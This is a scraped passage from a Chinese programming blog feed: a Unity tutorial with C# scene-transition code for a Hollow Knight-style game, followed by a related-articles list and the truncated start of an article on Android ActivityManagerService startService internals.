0.5f;for (; ; ){bool flag = false;cameraFadeTimer -= Time.unscaledDeltaTime;if (info.WaitForSceneTransitionCameraFade &amp;&amp; cameraFadeTimer &gt; 0f){flag = true;}if (!info.IsReadyToActivate()){flag = true;}if (!flag){break;}yield return null;}sceneLoad.IsFetchAllowed = true;sceneLoad.IsActivationAllowed = true;}里面有几个需要实现的方法：首先是HeroController设置角色取消父对象的方法SetHeroParent：public void SetHeroParent(Transform newParent){transform.parent = newParent;if (newParent == null){DontDestroyOnLoad(gameObject);}}不再是第一次玩游戏private void NoLongerFirstGame(){if (playerData.isFirstGame){playerData.isFirstGame = false;}}下面这个是这个要等到我们后续做到再实现的暂且TODO：public void SaveLevelState(){//TODO:}回到GlobalEnum创建好数组记录当前游戏状态：public enum GameState{INACTIVE, //非活跃MAIN_MENU, //主菜单LOADING, //加载ENTERING_LEVEL, //进入场景PLAYING, //游玩PAUSED, //暂停EXITING_LEVEL, //里面场景CUTSCENE, //过场PRIMER //先前的}再回到GameManager.cs中：public void SetState(GameState newState){gameState = newState;}当激活完成后，我们就可以用到我们熟悉的UnityEngine.SceneManagement.SceneManager.UnloadScene(lastSceneName);这个是卸载当前的创建，方法RefreshTilemapInfo(string targetScene)是用来重新获取新场景的tk2dtilemap，如果你看过我们上一期就知道这个tk2dtilemap用来获取每一个场景的宽度和高度：/// &lt;summary&gt;/// 重新刷新场景的tilemap的信息/// &lt;/summary&gt;/// &lt;param name="targetScene"&gt;&lt;/param&gt;public void RefreshTilemapInfo(string targetScene){if (IsNonGameplayScene()){return;}tk2dTileMap tk2dTileMap = null;int num = 0;while (tk2dTileMap == null &amp;&amp; num &lt; UnityEngine.SceneManagement.SceneManager.sceneCount){Scene sceneAt = UnityEngine.SceneManagement.SceneManager.GetSceneAt(num);if (string.IsNullOrEmpty(targetScene) || !(sceneAt.name != targetScene)){GameObject[] rootGameObjects = sceneAt.GetRootGameObjects();int num2 = 0;while (tk2dTileMap == null &amp;&amp; num2 &lt; rootGameObjects.Length){tk2dTileMap = GetTileMap(rootGameObjects[num2]);num2++;}}num++;}if (tk2dTileMap == null){Debug.LogErrorFormat("Using fallback 1 to find tilemap. Scene {0} requires manual fixing.", new object[]{targetScene});GameObject[] array = GameObject.FindGameObjectsWithTag("TileMap");int num3 = 0;while (tk2dTileMap == null &amp;&amp; num3 &lt; array.Length){tk2dTileMap = array[num3].GetComponent&lt;tk2dTileMap&gt;();num3++;}}if (tk2dTileMap == null){Debug.LogErrorFormat("Using fallback 2 to find tilemap. Scene {0} requires manual fixing.", new object[]{targetScene});GameObject gameObject = GameObject.Find("TileMap");if (gameObject != null){tk2dTileMap = GetTileMap(gameObject);}}if (tk2dTileMap == null){Debug.LogErrorFormat("Failed to find tilemap in {0} entirely.", new object[]{targetScene});return;}tilemap = tk2dTileMap;sceneWidth = tilemap.width;sceneHeight = tilemap.height;}private static tk2dTileMap GetTileMap(GameObject gameObject){if (gameObject.CompareTag("TileMap")){return gameObject.GetComponent&lt;tk2dTileMap&gt;();}return null;}重新获取场景引用SetupSceneRefs：public void SetupSceneRefs(bool refreshTilemapInfo){UpdateSceneName();if(ui == null){ui = UIManager.instance;}GameObject gameObject = GameObject.FindGameObjectWithTag("SceneManager");if(gameObject != null){sm = gameObject.GetComponent&lt;SceneManager&gt;();}else{Debug.Log("Scene Manager missing from scene " + sceneName);}if (IsGameplayScene()){if (hero_ctrl == null){SetupHeroRefs();}if (refreshTilemapInfo){RefreshTilemapInfo(sceneName);}}}private void SetupHeroRefs(){hero_ctrl = HeroController.instance;}还有开启场景后需要做的事情BeginScene：public void BeginScene(){inputHandler.SceneInit();if (hero_ctrl){hero_ctrl.SceneInit();}gameCams.SceneInit();if (IsMenuScene()){SetState(GameState.MAIN_MENU);UpdateUIStateFromGameState();return;}if (IsGameplayScene()){if ((!Application.isEditor &amp;&amp; !Debug.isDebugBuild) || Time.renderedFrameCount &gt; 3){PositionHeroAtSceneEntrance();}if(sm != null){return;}}else{if (IsNonGameplayScene()){SetState(GameState.CUTSCENE);UpdateUIStateFromGameState();return;}Debug.LogError("GM - Scene type is not set to a standard scene type.");UpdateUIStateFromGameState();}}我们通过场景名字来判断当前是什么类型的场景：public bool IsMenuScene(){UpdateSceneName();return sceneName == "Menu_Title";}public bool IsGameplayScene(){UpdateSceneName();return !IsNonGameplayScene();}public bool IsNonGameplayScene(){return IsCinematicScene() || sceneName == "Knight Pickup" || sceneName == "Pre_Menu_Intro" || sceneName == "Menu_Title" || sceneName == "End_Credits" || sceneName == "Menu_Credits" || sceneName == "Cutscene_Boss_Door" || sceneName == "PermaDeath_Unlock" || sceneName == "GG_Unlock" || sceneName == "GG_End_Sequence" || sceneName == "End_Game_Completion" || sceneName == "BetaEnd" || sceneName == "PermaDeath" || sceneName == "GG_Entrance_Cutscene" || sceneName == "GG_Boss_Door_Entrance";}public bool IsCinematicScene(){UpdateSceneName();return sceneName == "Intro_Cutscene_Prologue" || sceneName == "Opening_Sequence" || sceneName == "Prologue_Excerpt" || sceneName == "Intro_Cutscene" || sceneName == "Cinematic_Stag_travel" || sceneName == "PermaDeath" || sceneName == "Cinematic_Ending_A" || sceneName == "Cinematic_Ending_B" || sceneName == "Cinematic_Ending_C" || sceneName == "Cinematic_Ending_D" || sceneName == "Cinematic_Ending_E" || sceneName == "Cinematic_MrMushroom" || sceneName == "BetaEnd";}private void UpdateSceneName(){sceneName = GetBaseSceneName(UnityEngine.SceneManagement.SceneManager.GetActiveScene().name);}还需要让下一场景的内容做好准备OnNextLevelReady：public void OnNextLevelReady(){if (IsGameplayScene()){SetState(GameState.ENTERING_LEVEL);playerData.disablePause = false;inputHandler.AllowPause();inputHandler.StartAcceptingInput();Debug.LogFormat("OnNextLevelReady entryGateName =" + entryGateName);EnterHero(true);}}角色进入EnterHero():public void EnterHero(bool additiveGateSearch = false){if (RespawningHero){StartCoroutine(hero_ctrl.Respawn());FinishedEnteringScene();RespawningHero = false;return;}if (hazardRespawningHero){StartCoroutine(hero_ctrl.HazardRespawn());FinishedEnteringScene();hazardRespawningHero = false;return;}if (startedOnThisScene){if (IsGameplayScene()){FinishedEnteringScene();FadeSceneIn();}return;}SetState(GameState.ENTERING_LEVEL);if (string.IsNullOrEmpty(entryGateName)){Debug.LogError("No entry gate has been defined in the Game Manager, unable to move hero into position.");FinishedEnteringScene();return;}if (additiveGateSearch){Debug.Log("Searching for entry gate " + entryGateName + " !in the next scene: " + nextSceneName);foreach (GameObject gameObject in UnityEngine.SceneManagement.SceneManager.GetSceneByName(nextSceneName).GetRootGameObjects() ){TransitionPoint component = gameObject.GetComponent&lt;TransitionPoint&gt;();if(component != null &amp;&amp; component.name == entryGateName){Debug.Log("SUCCESS - Found as root object");StartCoroutine(hero_ctrl.EnterScene(component, entryDelay));return;}if(gameObject.name == "_Transition Gates"){TransitionPoint[] componentsInChildren = gameObject.GetComponentsInChildren&lt;TransitionPoint&gt;();for (int i = 0; i &lt; componentsInChildren.Length; i++){if(componentsInChildren[i].name == entryGateName){Debug.Log("SUCCESS - Found in _Transition Gates folder");StartCoroutine(hero_ctrl.EnterScene(componentsInChildren[i], entryDelay));return;}}}TransitionPoint[] componentsInChildren2 = gameObject.GetComponentsInChildren&lt;TransitionPoint&gt;();for (int j = 0; j &lt; componentsInChildren2.Length; j++){if (componentsInChildren2[j].name == entryGateName){Debug.Log("SUCCESS - Found in _Transition Gates folder");StartCoroutine(hero_ctrl.EnterScene(componentsInChildren2[j], entryDelay));return;}}}Debug.LogError("Searching in next scene for TransitionGate failed.");return;}GameObject gameObject2 = GameObject.Find(entryGateName);if(gameObject2 != null){TransitionPoint component2 = gameObject2.GetComponent&lt;TransitionPoint&gt;();StartCoroutine(hero_ctrl.EnterScene(component2, entryDelay));return;}Debug.LogError(string.Concat(new string[]{"No entry point found with the name \"",entryGateName,"\" in this scene (",sceneName,"). Unable to move hero into position, trying alternative gates..."}));TransitionPoint[] array = FindObjectsOfType&lt;TransitionPoint&gt;();if(array != null){StartCoroutine(hero_ctrl.EnterScene(array[0], entryDelay));return;}Debug.LogError("Could not find any gates in this scene. Trying last ditch spawn...");hero_ctrl.transform.SetPosition2D(tilemap.width / 2f, tilemap.height / 2f);}public void FinishedEnteringScene(){SetState(GameState.PLAYING);entryDelay = 0f;hasFinishedEnteringScene = true;if (OnFinishedSceneTransition != null){OnFinishedSceneTransition();}}public void FadeSceneIn(){cameraCtrl.FadeSceneIn();}回到HeroController.cs中，首先我们要制作玩家离开创建时的行为：public void LeaveScene(GatePosition? gate = null){isHeroInPosition = false;IgnoreInputWithoutReset();ResetHardLandingTimer();SetState(ActorStates.no_input);SetDamageMode(DamageMode.NO_DAMAGE);transitionState = HeroTransitionState.EXITING_SCENE;CancelFallEffects();tilemapTestActive = false;SetHeroParent(null);StopTilemapTest();if(gate != null){switch (gate.Value){case GatePosition.top:transition_vel = new Vector2(0f, MIN_JUMP_SPEED);cState.onGround = false;break;case GatePosition.right:transition_vel = new Vector2(RUN_SPEED, 0f);break;case GatePosition.left:transition_vel = new Vector2(-RUN_SPEED, 0f);break;case GatePosition.bottom:transition_vel = Vector2.zero;cState.onGround = false;break;}}cState.transitioning = true;}然后我们来制作一个协程处理进入场景：private bool stopWalkingOut;public float TIME_TO_ENTER_SCENE_BOT;public float TIME_TO_ENTER_SCENE_HOR;public float SPEED_TO_ENTER_SCENE_HOR;public float SPEED_TO_ENTER_SCENE_UP;public float SPEED_TO_ENTER_SCENE_DOWN; public IEnumerator EnterScene(TransitionPoint enterGate, float delayBeforeEnter){IgnoreInputWithoutReset();ResetMotion();airDashed = false;ResetHardLandingTimer();AffectedByGravity(false);sceneEntryGate = enterGate;SetState(ActorStates.no_input);transitionState = HeroTransitionState.WAITING_TO_ENTER_LEVEL;if (!cState.transitioning){cState.transitioning = true;}gatePosition = enterGate.GetGatePosition();if (gatePosition == GatePosition.top){cState.onGround = false;enteringVertically = true;renderer.enabled = false;float x2 = enterGate.transform.position.x + enterGate.entryOffset.x;float y2 = enterGate.transform.position.y + enterGate.entryOffset.y;transform.SetPosition2D(x2, y2);if (heroInPosition != null){heroInPosition(false);}yield return new WaitForSeconds(0.165f);if (!enterGate.customFade){gm.FadeSceneIn();}if (delayBeforeEnter &gt; 0f){yield return new WaitForSeconds(delayBeforeEnter);}if (enterGate.entryDelay &gt; 0f){yield return new WaitForSeconds(enterGate.entryDelay);}yield return new WaitForSeconds(0.4f);renderer.enabled = true;rb2d.velocity = new Vector2(0f, SPEED_TO_ENTER_SCENE_DOWN);transitionState = HeroTransitionState.ENTERING_SCENE;transitionState = HeroTransitionState.DROPPING_DOWN;AffectedByGravity(true);if (enterGate.hardLandOnExit){cState.willHardLand = true;}yield return new WaitForSeconds(0.33f);transitionState = HeroTransitionState.ENTERING_SCENE;if (transitionState != HeroTransitionState.WAITING_TO_TRANSITION){FinishedEnteringScene(true, false);}}else if (gatePosition == GatePosition.bottom){cState.onGround = false;enteringVertically = true;if (enterGate.alwaysEnterRight){FaceRight();}if (enterGate.alwaysEnterLeft){FaceLeft();}float x = enterGate.transform.position.x + enterGate.entryOffset.x;float y = enterGate.transform.position.y + enterGate.entryOffset.y + 3f;transform.SetPosition2D(x, y);if (heroInPosition != null){heroInPosition(false);}yield return new WaitForSeconds(0.165f);if (delayBeforeEnter &gt; 0f){yield return new WaitForSeconds(delayBeforeEnter);}if (enterGate.entryDelay &gt; 0f){yield return new WaitForSeconds(enterGate.entryDelay);}yield return new WaitForSeconds(0.4f);if (!enterGate.customFade){gm.FadeSceneIn();}if (cState.facingRight){transition_vel = new Vector2(SPEED_TO_ENTER_SCENE_HOR, SPEED_TO_ENTER_SCENE_UP);}else{transition_vel = new Vector2(-SPEED_TO_ENTER_SCENE_HOR, SPEED_TO_ENTER_SCENE_UP);}transitionState = HeroTransitionState.ENTERING_SCENE;transform.SetPosition2D(x, y);yield return new WaitForSeconds(TIME_TO_ENTER_SCENE_BOT);transition_vel = new Vector2(rb2d.velocity.x, 0f);AffectedByGravity(true);transitionState = HeroTransitionState.DROPPING_DOWN;}else if (gatePosition == GatePosition.left){cState.onGround = true;enteringVertically = false;SetState(ActorStates.no_input);float num = enterGate.transform.position.x + enterGate.entryOffset.x;float y3 = FindGroundPointY(num + 2f, enterGate.transform.position.y, false);transform.SetPosition2D(num, y3);if(heroInPosition != null){heroInPosition(true);}FaceRight();yield return new WaitForSeconds(0.165f);if (!enterGate.customFade){gm.FadeSceneIn();}if (delayBeforeEnter &gt; 0f){yield return new WaitForSeconds(delayBeforeEnter);}if (enterGate.entryDelay &gt; 0f){yield return new WaitForSeconds(enterGate.entryDelay);}yield return new WaitForSeconds(0.4f);transition_vel = new Vector2(RUN_SPEED, 0f);transitionState = HeroTransitionState.ENTERING_SCENE;yield return new WaitForSeconds(0.33f);FinishedEnteringScene(true, true);}else if(gatePosition == GatePosition.right){cState.onGround = true;enteringVertically = false;SetState(ActorStates.no_input);float num2 = enterGate.transform.position.x + enterGate.entryOffset.x;float y4 = FindGroundPointY(num2, enterGate.transform.position.y, false);transform.SetPosition2D(num2, y4);if(heroInPosition != null){heroInPosition(true);}FaceLeft();yield return new WaitForSeconds(0.165f);if (!enterGate.customFade){gm.FadeSceneIn();}if (delayBeforeEnter &gt; 0f){yield return new WaitForSeconds(delayBeforeEnter);}if (enterGate.entryDelay &gt; 0f){yield return new WaitForSeconds(enterGate.entryDelay);}yield return new WaitForSeconds(0.4f);transition_vel = new Vector2(-RUN_SPEED, 0f);transitionState = HeroTransitionState.ENTERING_SCENE;yield return new WaitForSeconds(0.33f);FinishedEnteringScene(true, true);}else if(gatePosition == GatePosition.door){if (enterGate.alwaysEnterRight){FaceRight();}if (enterGate.alwaysEnterLeft){FaceLeft();}cState.onGround = true;enteringVertically = false;SetState(ActorStates.no_input);SetState(ActorStates.idle);animCtrl.PlayClip("Idle");transform.SetPosition2D(FindGroundPoint(enterGate.transform.position, false));if(heroInPosition != null){heroInPosition(false);}yield return new WaitForEndOfFrame();if (delayBeforeEnter &gt; 0f){yield return new WaitForSeconds(delayBeforeEnter);}if (enterGate.entryDelay &gt; 0f){yield return new WaitForSeconds(enterGate.entryDelay);}yield return new WaitForSeconds(0.4f);if (!enterGate.customFade){}float realTimeSinceStartup = Time.realtimeSinceStartup;if (enterGate.dontWalkOutOfDoor){yield return new WaitForSeconds(0.33f);}else{float clipDuration = animCtrl.GetClipDuration("Exit Door To Idle");animCtrl.PlayClip("Exit Door To Idle");if(clipDuration &gt; 0f){yield return new WaitForSeconds(clipDuration);}else{yield return new WaitForSeconds(0.33f);}}FinishedEnteringScene(true, false);}}来到GlobalEnum添加好角色转移的状态：public enum HeroTransitionState{WAITING_TO_TRANSITION,EXITING_SCENE,WAITING_TO_ENTER_LEVEL,ENTERING_SCENE,DROPPING_DOWN}找到落地点：public Vector3 FindGroundPoint(Vector2 startPoint,bool useExtended = false){float num = FIND_GROUND_POINT_DISTANCE;if (useExtended){num = FIND_GROUND_POINT_DISTANCE_EXT;}RaycastHit2D raycastHit2D = Physics2D.Raycast(startPoint, Vector2.down, num, LayerMask.GetMask("Terrain"));if(raycastHit2D.collider == null){Debug.LogErrorFormat("FindGroundPoint: Could not find ground point below {0}, check reference position is not too high (more than {1} tiles).", new object[]{startPoint.ToString(),num});}return new Vector3(raycastHit2D.point.x, raycastHit2D.point.y + col2d.bounds.extents.y - col2d.offset.y + 0.01f, transform.position.z);}private float FindGroundPointY(float x, float y, bool useExtended = false){float num = FIND_GROUND_POINT_DISTANCE;if (useExtended){num = FIND_GROUND_POINT_DISTANCE_EXT;}RaycastHit2D raycastHit2D = Physics2D.Raycast(new Vector2(x, y), Vector2.down, num, LayerMask.GetMask("Terrain"));if (raycastHit2D.collider == null){Debug.LogErrorFormat("FindGroundPoint: Could not find ground point below ({0},{1}), check reference position is not too high (more than {2} tiles).", new object[]{x,y,num});}return raycastHit2D.point.y + col2d.bounds.extents.y - col2d.offset.y + 0.01f;}还有我么上期降到的：private void FinishedEnteringScene(bool setHazardMarker = true, bool preventRunBob = false){if(isEnteringFirstLevel){isEnteringFirstLevel = false;}else{playerData.disablePause = false;}cState.transitioning = false;transitionState = HeroTransitionState.WAITING_TO_TRANSITION;stopWalkingOut = false;SetStartingMotionState(preventRunBob);AffectedByGravity(true);if (setHazardMarker){if (sceneEntryGate == null){playerData.SetHazardRespawn(transform.position, cState.facingRight);}else if (!sceneEntryGate.nonHazardGate){playerData.SetHazardRespawn(sceneEntryGate.respawnMarker);}}SetDamageMode(DamageMode.FULL_DAMAGE);if (enterWithoutInput){enterWithoutInput = false;}else{AcceptInput();}gm.FinishedEnteringScene();positionHistory[0] = transform.position;positionHistory[1] = transform.position;tilemapTestActive = true;}至此我们制作了完整的切换创建的脚本逻辑处理，但还有一个问题没解决，那就是上面将的如何打完门直接场景转换呢？当然使用到我们的playmaker了！如果是激活状态，我们就直接销毁它，但这个要到我们后面做到可持续化数据才能用到检查攻击者的类型，也就是骨钉攻击为玩家创建新的方法EnterWithoutInput()：public void EnterWithoutInput(bool flag){enterWithoutInput = flag;}然后就是自定义playmakerFSM：我们还是用到了GameManager的BeginSceneTransition()方法using UnityEngine;namespace HutongGames.PlayMaker.Actions
{[ActionCategory("Game Manager")][Tooltip("Perform a generic scene transition.")]public class BeginSceneTransition : FsmStateAction{public FsmString sceneName;public FsmString entryGateName;public FsmFloat entryDelay;[ObjectType(typeof(GameManager.SceneLoadVisualizations))]public FsmEnum visualization;public bool preventCameraFadeOut;public override void Reset(){sceneName = "";entryGateName = "left1";entryDelay = 0f;visualization = new FsmEnum{Value = GameManager.SceneLoadVisualizations.Default};preventCameraFadeOut = false;}public override void OnEnter(){GameManager unsafeInstance = GameManager.instance;if (unsafeInstance == null){LogError("Cannot BeginSceneTransition() before the game manager is loaded.");}else{unsafeInstance.BeginSceneTransition(new GameManager.SceneLoadInfo{SceneName = sceneName.Value,EntryGateName = entryGateName.Value,EntryDelay = entryDelay.Value,Visualization = (GameManager.SceneLoadVisualizations)visualization.Value,PreventCameraFadeOut = true,WaitForSceneTransitionCameraFade = !preventCameraFadeOut,AlwaysUnloadUnusedAssets = false});}Finish();}}}总结最后我们来看看效果吧上面的UI是我后面做的先别管：然后黑屏到达Town：OK能移动还没有Error，完成。http://www.ppmy.cn/news/1540877.html相关文章Android Framework AMS（08）service组件分析-2(startService和StopService关键流程分析)该系列文章总纲链接&amp;#xff1a;专题总纲目录 Android Framework 总纲 本章关键点总结 &amp; 说明&amp;#xff1a; 说明&amp;#xff1a;上一章节主要解读应用层service组件启动的2种方式startService和bindService&amp;#xff0c;以及从APP层到AMS调用之间的打通。本章节主要关注service…阅读更多...深入解析缓存与数据库数据不一致问题缓存层是提高系统响应速度和扩展性的关键组件。然而&amp;#xff0c;缓存层的引入也带来了数据一致性的挑战。 
当数据库中的数据发生变化时&amp;#xff0c;如何确保这些变化能够及时且准确地反映到缓存中&amp;#xff0c;是确保用户体验和系统可靠性的重要问题。 
1. 数据一致性 
首先&amp;am…阅读更多...go压缩的使用基础&amp;#xff1a;使用go创建一个zip 
func base(path string) {// 创建 zip 文件zipFile, err : os.Create("test.zip")if err ! nil {panic(err)}defer zipFile.Close()// 创建一个新的 *Writer 对象zipWriter : zip.NewWriter(zipFile)defer zipWriter.Close()// 创…阅读更多...原理代码解读：基于DiT结构视频生成模型的ControlNetDiffusion Models视频生成-博客汇总 前言：相比于基于UNet结构的视频生成模型，DiT结构的模型最大的劣势在于生态不够完善，配套的ControlNet、IP-Adapter等开源权重不多，导致难以落地。最近DiT-based 5B的ControlNet开源了，相比于传统的ControlNet有不少改进点，这篇博客将从…阅读更多...RabbitMQ 作为消息中间件，实现了支付消息的异步发送和接收， 同步和异步相比 响应速度具体比较在支付场景中&amp;#xff0c;使用 RabbitMQ 实现消息的异步发送和接收与同步处理相比&amp;#xff0c;响应速度和整体系统性能会有显著的不同。以下是同步和异步方式在响应速度上的详细比较&amp;#xff1a;  
1. 同步处理方式 
在同步模式下&amp;#xff0c;支付消息的处理流程通常是&amp;#xf…阅读更多...如何将 ECharts 图表插入 HTML Canvas在 Web 开发中&amp;#xff0c;数据可视化是一个常见且重要的需求。ECharts 是一个强大的图表库&amp;#xff0c;而 HTML5 Canvas 则提供了灵活的绘图能力。今天&amp;#xff0c;我们将探讨如何将这两者结合起来&amp;#xff0c;实现将 ECharts 生成的图表插入到 HTML Canvas 中的特定位置。 
为…阅读更多...docker 文件目录迁移文章参考 
du -hs /var/lib/docker/ 命令查看磁盘使用情况。 
du -hs /var/lib/docker/docker system df命令&amp;#xff0c;类似于Linux上的df命令&amp;#xff0c;用于查看Docker的磁盘使用情况: 
rootnn0:~$ docker system df
TYPE TOTAL ACTIVE SIZE RECLAIMABLE
Images 7 2 122.2…阅读更多...【微信小程序_11_全局配置】摘要：本文介绍了微信小程序全局配置文件 app.json 中的常用配置项，重点阐述了 window 节点的各项配置，包括导航栏标题文字、背景色、标题颜色，窗口背景色、下拉刷新样式以及上拉触底距离等。通过这些配置可实现小程序窗口外观的个性化设置，提升用户体验。 微信小程序_11_全…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:52 +0000</pubDate>
    </item>
    <item>
      <title>Android Framework AMS（08）service组件分析-2(startService和StopService关键流程分析)</title>
      <link>https://www.ppmy.cn/news/1540876.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Android Framework AMS（08）service组件分析-2(startService和StopService关键流程分析)news/2025/10/31 23:18:51/该系列文章总纲链接：专题总纲目录 Android Framework 总纲本章关键点总结 &amp; 说明：说明：上一章节主要解读应用层service组件启动的2种方式startService和bindService，以及从APP层到AMS调用之间的打通。本章节主要关注service组件启动方式的一种：startService启动方式，分析关键API为service组件的startService和stopService方法。我们从AMS.startService和AMS.stopService分别来分析，分析的主要流程为：AMS.startService-&gt;service组件onCreate、onStartCommandAMS.stopService-&gt;service组件onDestroy接下来开始详细解读。1 AMS.startService流程解读(onCreate、onStartCommand)AMS.startService代码实现如下：//ActivityManagerService@Overridepublic ComponentName startService(IApplicationThread caller, Intent service,String resolvedType, int userId) {// 检查调用者是否是隔离的进程，如果不是，则抛出安全异常enforceNotIsolatedCaller("startService");synchronized(this) {final int callingPid = Binder.getCallingPid();final int callingUid = Binder.getCallingUid();final long origId = Binder.clearCallingIdentity();ComponentName res = mServices.startServiceLocked(caller, service,resolvedType, callingPid, callingUid, userId);Binder.restoreCallingIdentity(origId);return res;}}//...这里调用了ActivityService的startServiceLocked方法，代码实现如下：//ActivityService//关键流程：step1ComponentName startServiceLocked(IApplicationThread caller,Intent service, String resolvedType,int callingPid, int callingUid, int userId) {// 判断调用者是否在前台运行final boolean callerFg;if (caller != null) {// 获取调用者的应用记录final ProcessRecord callerApp = mAm.getRecordForAppLocked(caller);// 判断调用者是否在前台运行，如果不是后台非交互线程组，则认为是前台callerFg = callerApp.setSchedGroup != Process.THREAD_GROUP_BG_NONINTERACTIVE;} else {// 如果没有调用者，也认为是前台callerFg = true;}// 检索服务，如果服务不存在或者没有权限，则返回相应的结果ServiceLookupResult res = retrieveServiceLocked(service, resolvedType,callingPid, callingUid, userId, true, callerFg);// 如果服务记录为空，说明服务不存在或者没有权限，返回错误信息if (res.record == null) {return new ComponentName("!", res.permission != null? res.permission : "private to package");}// 获取服务记录ServiceRecord r = res.record;// 检查用户是否存在if (!mAm.getUserManagerLocked().exists(r.userId)) {return null;}// 检查调用者是否有权限授予URI权限NeededUriGrants neededGrants = mAm.checkGrantUriPermissionFromIntentLocked(callingUid, r.packageName, service, service.getFlags(), null, r.userId);// 如果服务已经在重启计划中，取消重启if (unscheduleServiceRestartLocked(r, callingUid, false)) {}// 更新服务最后活跃的时间r.lastActivity = SystemClock.uptimeMillis();// 设置服务启动请求为真r.startRequested = true;// 设置服务不是延迟停止的r.delayedStop = false;// 添加一个新的启动项到服务的待启动列表中r.pendingStarts.add(new ServiceRecord.StartItem(r, false, r.makeNextStartId(),service, neededGrants));// 获取服务映射对象final ServiceMap smap = getServiceMap(r.userId);boolean addToStarting = false;// 如果调用者不是前台，服务应用记录为空，并且用户已启动，则进行以下操作if (!callerFg &amp;&amp; r.app == null &amp;&amp; mAm.mStartedUsers.get(r.userId) != null) {// 获取服务要运行的进程记录ProcessRecord proc = mAm.getProcessRecordLocked(r.processName, r.appInfo.uid, false);// 如果进程记录为空，或者进程状态大于接收者状态，执行以下操作if (proc == null || proc.curProcState &gt; ActivityManager.PROCESS_STATE_RECEIVER) {// 如果服务是延迟的，直接返回服务名称if (r.delayed) {return r.name;}// 如果正在启动的后台服务数量超过了最大限制，将服务添加到延迟启动列表if (smap.mStartingBackground.size() &gt;= mMaxStartingBackground) {smap.mDelayedStartList.add(r);r.delayed = true;return r.name;}// 标记服务需要添加到启动列表addToStarting = true;} else if (proc.curProcState &gt;= ActivityManager.PROCESS_STATE_SERVICE) {// 如果进程状态大于或等于服务状态，也标记服务需要添加到启动列表addToStarting = true;}}// 调用内部方法来实际启动服务return startServiceInnerLocked(smap, service, r, callerFg, addToStarting);}//关键流程：step2ComponentName startServiceInnerLocked(ServiceMap smap, Intent service,ServiceRecord r, boolean callerFg, boolean addToStarting) {// 获取服务状态跟踪器ProcessStats.ServiceState stracker = r.getTracker();// 如果服务状态跟踪器存在，设置服务为已启动状态，并更新内存因素和最后活动时间if (stracker != null) {stracker.setStarted(true, mAm.mProcessStats.getMemFactorLocked(), r.lastActivity);}// 设置服务的callStart标志为false，表示服务尚未调用 onStartCommandr.callStart = false;synchronized (r.stats.getBatteryStats()) {r.stats.startRunningLocked();}// 关键方法：实际启动服务，如果启动失败，返回错误信息String error = bringUpServiceLocked(r, service.getFlags(), callerFg, false);if (error != null) {return new ComponentName("!!", error);}// 如果服务请求启动并且需要添加到正在启动的服务列表中if (r.startRequested &amp;&amp; addToStarting) {// 如果当前没有其他后台服务正在启动，标记为第一个启动的后台服务boolean first = smap.mStartingBackground.size() == 0;// 将服务添加到正在启动的后台服务列表中smap.mStartingBackground.add(r);// 设置服务的后台启动超时时间r.startingBgTimeout = SystemClock.uptimeMillis() + BG_START_TIMEOUT;// 如果是第一个启动的后台服务，重新调度延迟启动的服务if (first) {smap.rescheduleDelayedStarts();}} else if (callerFg) {// 如果调用者在前台，确保服务不是正在启动的后台服务smap.ensureNotStartingBackground(r);}// 返回服务的组件名称return r.name;}//关键流程：step3private final String bringUpServiceLocked(ServiceRecord r,int intentFlags, boolean execInFg, boolean whileRestarting) {// 如果服务的应用记录不为空且应用线程不为空，说明服务已经在运行，直接发送服务参数if (r.app != null &amp;&amp; r.app.thread != null) {sendServiceArgsLocked(r, execInFg, false);return null;}// 如果服务不在重启中，并且重启延迟时间大于0，则不启动服务if (!whileRestarting &amp;&amp; r.restartDelay &gt; 0) {return null;}// 如果服务在重启中，从重启服务列表中移除该服务if (mRestartingServices.remove(r)) {clearRestartingIfNeededLocked(r);}// 如果服务是延迟启动的，从延迟启动列表中移除该服务，并设置服务不再延迟if (r.delayed) {getServiceMap(r.userId).mDelayedStartList.remove(r);r.delayed = false;}// 如果用户未启动，关闭服务并返回if (mAm.mStartedUsers.get(r.userId) == null) {bringDownServiceLocked(r);return msg;}try {// 设置包停止状态为非停止状态AppGlobals.getPackageManager().setPackageStoppedState(r.packageName, false, r.userId);} catch (RemoteException e) {//...}// 判断服务是否运行在隔离进程中final boolean isolated = (r.serviceInfo.flags &amp; ServiceInfo.FLAG_ISOLATED_PROCESS) != 0;final String procName = r.processName;ProcessRecord app;// 如果服务不在隔离进程中，尝试获取已有的进程记录if (!isolated) {app = mAm.getProcessRecordLocked(procName, r.appInfo.uid, false);// 如果进程记录不为空且进程线程不为空，尝试添加包并启动服务if (app != null &amp;&amp; app.thread != null) {try {app.addPackage(r.appInfo.packageName, r.appInfo.versionCode, mAm.mProcessStats);//关键方法：实际启动服务realStartServiceLocked(r, app, execInFg);return null;} catch (RemoteException e) {//...}}} else {// 如果服务运行在隔离进程中，尝试获取隔离进程记录app = r.isolatedProc;}// 如果进程记录为空，尝试启动新进程if (app == null) {//这里是不是眼熟，和startActivity的思路是一致的，创建进程。if ((app = mAm.startProcessLocked(procName, r.appInfo, true, intentFlags,"service", r.name, false, isolated, false)) == null) {bringDownServiceLocked(r);return msg;}// 如果服务运行在隔离进程中，保存隔离进程记录if (isolated) {r.isolatedProc = app;}}// 如果服务不在待处理列表中，添加到待处理列表if (!mPendingServices.contains(r)) {mPendingServices.add(r);}// 如果服务已经请求停止，取消停止请求if (r.delayedStop) {r.delayedStop = false;if (r.startRequested) {stopServiceLocked(r);}}return null;}//关键流程：step4private final void realStartServiceLocked(ServiceRecord r,ProcessRecord app, boolean execInFg) throws 